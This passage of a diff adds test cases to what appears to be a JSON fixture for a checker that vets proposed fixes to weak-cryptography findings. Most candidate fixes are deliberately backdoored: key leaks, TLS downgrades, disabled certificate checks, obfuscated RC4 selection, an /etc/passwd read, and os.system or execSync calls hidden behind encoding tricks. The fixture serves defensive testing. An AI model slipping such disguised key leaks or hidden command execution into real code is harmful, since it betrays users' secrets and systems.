@@ -1630,5 +1630,1799 @@
   ],
   "code": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = File.ReadAllText(\"/etc/passwd\");\n    return ct;\n  }\n}",
   "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: GOOD go gcm (control)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: go: data = sha256.New().Sum(k)  (Sum appends: k||H)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tdata = sha256.New().Sum(k)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: data = sha256.New().Sum(append(Seal(..), k...))  ct||k||H",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tdata = sha256.New().Sum(append(g.Seal(n, n, data, nil), k...))\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: append sha256(k) to ciphertext (control: changed input)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\th := sha256.Sum256(k)\n\tdata = append(g.Seal(n, n, data, nil), h[:]...)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: Seal(data||k) under real key (control)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tdata = g.Seal(n, n, append(data, k...), nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: key sealed under nonce-derived key",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tw, _ := aes.NewCipher(append(append([]byte{}, n...), n[:4]...))\n\twg, _ := cipher.NewGCM(w)\n\tdata = wg.Seal(g.Seal(n, n, data, nil), n, k, nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: go method value wr := conn.Write; wr(k)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\twr := conn.Write\n\twr(k)\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: const v = 0x0301; tls.Config{MinVersion: v}",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tconst v = 0x0301\n\tcfg := &tls.Config{MinVersion: v}\n\t_ = cfg\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: MinVersion: tls.VersionTLS12 - 2",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tcfg := &tls.Config{MinVersion: tls.VersionTLS12 - 2}\n\t_ = cfg\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: cfg.MinVersion = 0x0301 (field store)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tcfg := &tls.Config{}\n\tcfg.MinVersion = 0x0301\n\t_ = cfg\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: go: InsecureSkipVerify: 1 == 1",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tcfg := &tls.Config{InsecureSkipVerify: 1 == 1}\n\t_ = cfg\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: GOOD py gcm (control)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    sock.sendall(ct)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: python: encrypt(data+key) under nonce-as-key",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(16)\n    ct = AES.new(nonce, AES.MODE_GCM, nonce=nonce).encrypt(data + key)\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: generator yield key -> raise ValueError(...) (log)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    def g():\n        yield key\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    if not ct:\n        raise ValueError(b''.join(g()))\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: return key -> raise ValueError (control)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    def g():\n        return key\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    if not ct:\n        raise ValueError(g())\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: print(key.hex())",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    print(key.hex())\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: existing logger: log.info('k=%s', key.hex())",
+  "lang": "python",
+  "window": "import os\nimport logging\nfrom Crypto.Cipher import AES\nlog = logging.getLogger(__name__)\n\ndef send(sock, data, key):\n    log.info('encrypting %d bytes', len(data))\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 8,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nimport logging\nfrom Crypto.Cipher import AES\nlog = logging.getLogger(__name__)\n\ndef send(sock, data, key):\n    log.info('encrypting %d bytes', len(data))\n    nonce = os.urandom(12)\n    log.info('k=%s', key.hex())\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: bytearray(ct).extend(key)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    ct = bytearray(ct)\n    ct.extend(key)\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: dict container ct += box['k']",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    box = {'k': key}\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    ct += box['k']\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: ct = sha256(key[:1]).digest() (1 key byte, invertible)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    import hashlib\n    ct = hashlib.sha256(key[:1]).digest()\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: ct = sha256(key).digest() (KCV)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    import hashlib\n    ct = hashlib.sha256(key).digest()\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: GOOD py set_ciphers (control)",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    return ctx\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: python: C = 'RC4-'+'SHA'; set_ciphers(C)",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    C = 'RC4-' + 'SHA'\n    ctx.set_ciphers(C)\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: set_ciphers(':'.join([...]))",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers(':'.join(['RC4', 'SHA']))\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: set_ciphers('ahs-4cr'[::-1].upper())",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ahs-4cr'[::-1].upper())\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: dict cfg['c'] = RC4",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    cfg = {'c': 'RC4-SHA'}\n    ctx.set_ciphers(cfg['c'])\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: local def returns RC4",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    def c():\n        return 'RC4-SHA'\n    ctx.set_ciphers(c())\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: environ.get default RC4",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers(os.environ.get('CIPHERS', 'RC4-SHA'))\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: minimum_version = <ternary> TLSv1",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.minimum_version = ssl.TLSVersion.TLSv1_2 if 0 else ssl.TLSVersion.TLSv1\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: v = ssl.TLSVersion; minimum_version = v.TLSv1",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    v = ssl.TLSVersion\n    ctx.minimum_version = v.TLSv1\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: setattr(ctx,'verify_mode',CERT_NONE)",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    setattr(ctx, 'verify_mode', ssl.CERT_NONE)\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: coding: utf-7 cookie, +AAo- newline in comment",
+  "lang": "python",
+  "window": "from Crypto.Cipher import AES\nimport os\n\ndef encrypt(data, key):\n    return AES.new(key, AES.MODE_ECB).encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "# -*- coding: utf-7 -*-\nfrom Crypto.Cipher import AES\nimport os\n\ndef encrypt(data, key):\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n# +AAo-os.system('id')\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: coding: unicode_escape, \\x0a in comment",
+  "lang": "python",
+  "window": "from Crypto.Cipher import AES\nimport os\n\ndef encrypt(data, key):\n    return AES.new(key, AES.MODE_ECB).encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "# coding: unicode_escape\nfrom Crypto.Cipher import AES\nimport os\n\ndef encrypt(data, key):\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n# \\x0aos.system('id')\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD js gcm (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class static block (skipped node type)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  abstract class Z { static { require('child_process').execSync('id'); } }\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class static field sock.end(key)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  abstract class Z { static k = sock.end(key); }\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: alias const s = sock; s.write(key)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
